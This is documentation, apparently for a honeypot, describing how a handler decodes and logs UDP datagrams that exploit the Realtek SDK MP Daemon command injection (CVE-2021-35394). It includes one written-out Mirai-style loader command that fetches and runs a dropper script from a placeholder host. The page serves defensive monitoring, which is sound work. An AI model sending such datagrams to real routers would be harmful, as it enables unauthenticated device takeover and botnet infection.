# `realtek` decoded data

Transport: UDP. Shared encodings and frame fields are described in [Logging and producers](../logging.md#decoded-data).

**`decoded`:** One `read` frame per datagram: `direction`, `command`, `shell`, `path`, `urls`, `sample_hashes`, `payload_hash`, `payload`, `truncated`

Realtek Jungle SDK "MP Daemon" (`UDPServer`, udp/9034), shipped in routers and repeaters built on the Realtek SDK up to v3.4.14B. The daemon passes commands that start with `orf` to `system()`, so `orf;<shell>` runs any command from a single unauthenticated datagram (CVE-2021-35394). Mirai-family loaders use it to fetch and run droppers, e.g. `orf;cd /tmp;rm wget.sh;/bin/busybox wget http://<host>:800/wget.sh;sh wget.sh realtek; #`.

`command` is `orf` when the datagram starts with `orf` followed by `;`, `|`, `&`, `$(`, a backtick, a line break or nothing; other datagrams on the port have no `command`. `shell` is the injected command without the `orf` prefix, its separator and a trailing `#` comment. `urls` lists, in order and without duplicates, the `http://`, `https://`, `ftp://` and `tftp://` arguments of `wget`, `curl`, `tftp` and `ftpget` (also as paths like `/bin/busybox wget`), at most 16; `path` is the first. `payload_hash` is the SHA-256 of the captured datagram, as in the `udp` catch-all. Datagrams over 1024 bytes are capped with `truncated`.

The handler never replies. With `realtek.fetch_samples` (default `false`) it downloads up to 2 http(s) URLs per datagram during the datagram (5 s timeout each, 10 MiB cap), stores them under `samples/` and sets `sample_hashes` (URL → SHA-256). Because UDP sources can be forged, fetches connect only to public unicast addresses, and each URL is fetched at most once per hour; a repeat in that window reuses the stored hash.
